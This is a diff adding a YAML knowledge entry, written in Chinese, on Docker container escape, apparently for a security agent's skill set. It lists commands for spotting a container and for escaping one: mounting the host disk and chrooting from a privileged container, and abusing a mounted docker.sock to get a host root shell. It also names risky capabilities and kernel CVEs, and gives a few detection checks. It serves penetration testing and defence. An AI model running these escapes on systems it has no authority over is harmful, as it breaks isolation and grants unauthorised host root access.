@@ -1,0 +1,70 @@
+name: Docker容器逃逸
+description: Docker容器逃逸技术和检测方法
+domain: cloud
+version: '1.0'
+tags:
+- cloud
+- docker
+- container
+- escape
+knowledge: |
+  # Docker容器逃逸
+
+  ## 环境检测
+
+  ### 检查是否在容器中
+  ```bash
+  # 检查 .dockerenv 文件
+  ls -la /.dockerenv
+
+  # 检查 cgroup
+  cat /proc/1/cgroup | grep docker
+
+  # 检查环境变量
+  env | grep -i docker
+  ```
+
+  ## 常见逃逸方法
+
+  ### 1. 特权模式逃逸
+  ```bash
+  # 挂载宿主机根目录
+  mkdir /mnt/host
+  mount /dev/sda1 /mnt/host
+
+  # 切换到宿主机
+  chroot /mnt/host /bin/bash
+  ```
+
+  ### 2. Docker Socket 挂载
+  ```bash
+  # 检查 docker socket
+  ls -la /var/run/docker.sock
+
+  # 使用 docker 命令
+  docker run -it -v /:/host ubuntu chroot /host /bin/bash
+  ```
+
+  ### 3. 危险能力利用
+  ```bash
+  # 检查能力
+  capsh --print
+
+  # SYS_MODULE 能力 - 加载内核模块
+  # SYS_PTRACE 能力 - ptrace 宿主机进程
+  ```
+
+  ### 4. 内核漏洞利用
+  ```bash
+  # 检查内核版本
+  uname -a
+
+  # 常见漏洞：Dirty Pipe (CVE-2022-0847)
+  # 常见漏洞：Dirty Cow (CVE-2016-5195)
+  ```
+
+  ## 检测点
+
+  - 检查挂载点：`mount | grep /host`
+  - 检查设备：`fdisk -l`
+  - 检查网络：`ip link`
